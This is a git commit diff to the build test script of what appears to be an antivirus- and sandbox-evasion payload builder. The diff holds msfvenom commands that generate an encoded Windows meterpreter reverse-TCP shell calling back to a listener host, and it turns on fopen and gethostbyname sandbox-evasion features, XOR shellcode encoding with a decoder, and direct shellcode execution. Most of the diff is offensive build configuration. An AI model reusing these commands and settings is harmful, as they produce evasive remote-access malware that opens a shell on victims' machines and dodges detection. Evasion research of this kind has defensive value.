f5dc61aadcf3fc183d2b66e5a5ce6e3b578ce577
Florian Saager <florian.saager@rub.de>
2018-11-07 15:06:34 +0100

    Removed defs.h because it's no longer needed

--- build/build_test.sh
+++ build/build_test.sh
@@ -15,7 +15,7 @@ LHOST=$GLOBAL_LHOST
 
 # generate payload
 #msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
-msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.102 lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > output/thepayload.bin
+#msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.102 lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > output/thepayload.bin
 
 # import feature construction interface
 . build/feature_construction.sh
@@ -24,14 +24,20 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.102 lport=$LPORT -e
 add_feature fopen_sandbox_evasion
 
 # add gethostbyname killswitch evasion feature
-append_value KVALUE localhost source/techniques.h
+append_value KVALUE localhost source/evasion.h
 add_feature gethostbyname_sandbox_evasion
 
 # hide console window
 #add_feature hide_console
 
 # set shellcode source
-shellcode_source download_powershell
+shellcode_source static_from_file
+
+# encode shellcode
+encode_shellcode xor 
+
+# set decoder
+set_decoder xor
 
 # set shellcode binding technique
 shellcode_binding exec_shellcode
